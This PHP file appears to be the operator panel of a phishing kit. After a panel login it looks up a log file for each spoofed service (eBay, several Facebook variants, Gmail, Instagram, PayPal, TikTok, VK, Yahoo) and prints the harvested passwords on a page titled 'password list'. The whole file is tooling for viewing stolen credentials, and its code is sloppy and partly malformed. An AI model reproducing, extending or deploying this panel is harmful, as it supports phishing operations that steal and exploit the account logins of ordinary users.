<?php 
include('config.php');
$id = $_POST['id'];
  include("auth.php");
$site = $_POST['site'];
 if ($auth == $id )
$site = $_POST['site'];
{   
function pass($site) { 
  if ($site == "ebay") { return  'ebay_thite_log.txt'; }
    if ($site == "facebook_desktop_and_mobile_auto_redirect") { return  'fb_thite_log.txt'; }

      if ($site == "fb_advanced") { return  'fb_thite_log.txt'; }
        if ($site == "fb_messenger") { return  'fb_thite_log.txt'; }
           if ($site == "fb_security_virify") { return  'fb_thite_log.txt'; }
              if ($site == "gmail") { return  'gm_thite_log'; }

                 if ($site == "ig_followers") { return  'ig_thite_log'; }
                    if ($site == "paypal") { return  'pp_thite_log'; }
                     if ($site == "tiktok") { return  'tk_thite_log'; }
                      if ($site == "vk") { return  'vk_thite_log.txt'; }
                        if ($site == "yahoo") { return  'yh_thite_log.txt'; }
}







   $user = $_POST['user'];
   $pass = $_POST['pass'];
   $result = mysqli_query($conn,"SELECT * FROM ser_ser");


 while ($acc_db = mysqli_fetch_assoc($result) ): 
     if ($user == $acc_db['usr']) { $cuser='true';}//end user check 
     if ($cuser == 'true') {  if ($pass == $acc_db['pa_pa'] ) {$cpass = 'true';}  }//end of pass user true end
        

endwhile;


?> 

<html> 
<body> 
<header> <title> password list </title> </header>
<div id="header"> <h1>scrip kiddies <?php echo $user;?> </h1> </div> 
<div id="pass_list"> 
<?php if ($cpass == 'true') { 
$fl = pass($site);
$path ="$user/$site/$fl";
$file = fopen($path,'r');
$passw = fread($file,filesize($path));
?> <civ id="password"> 
<?php echo $passw ; }//end manin page 
 ?>
</div>                

</div>
<?php



}//id check end 

/*else {  
 //id invalid do somethinxg 
 echo "invalid id " ; } */

?>

